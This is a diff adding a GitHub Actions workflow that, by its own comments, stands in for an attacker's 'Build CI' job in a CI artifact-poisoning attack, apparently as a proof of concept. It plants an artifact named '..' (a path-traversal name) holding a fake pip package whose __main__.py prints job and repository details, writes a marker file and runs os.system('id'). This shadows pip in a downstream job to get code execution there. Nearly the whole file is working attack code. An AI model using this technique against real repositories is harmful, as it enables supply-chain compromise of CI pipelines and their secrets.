@@ -1,0 +1,39 @@
+---
+# Attacker-side stand-in for the target's "Build CI" producer. In the real
+# attack this is a fork PR that rewrites .github/workflows/build.yml (name
+# "Build CI") so it uploads crafted artifacts. Here the same actor code runs
+# via workflow_dispatch.
+name: GAB Legend Build CI
+
+on:
+  workflow_dispatch:
+  push:
+    branches: [main]
+
+permissions:
+  contents: read
+  actions: read
+
+jobs:
+  build:
+    name: Build
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Plant attacker-controlled artifact named ".."
+        uses: ./.github/actions/plant-multi
+        with:
+          name: ".."
+          entries: |
+            [
+              {"name":"pip/__init__.py","content":""},
+              {"name":"pip/__main__.py","content":"import os\nprint('PWNED_PIP_SHADOW job=' + str(os.environ.get('GITHUB_JOB')) + ' cwd=' + os.getcwd())\nprint('PWNED_REPO=' + str(os.environ.get('GITHUB_REPOSITORY')))\nopen('/tmp/gab_pip_pwn.txt','a').write('attacker pip/__main__.py executed in ' + str(os.environ.get('GITHUB_JOB')) + '\\n')\nos.system('id')\n"}
+            ]
+
+      - name: List artifacts visible for this run
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          gh api "repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/artifacts" \
+            --jq '.artifacts[] | "ID=\(.id) NAME=[\(.name)]"'
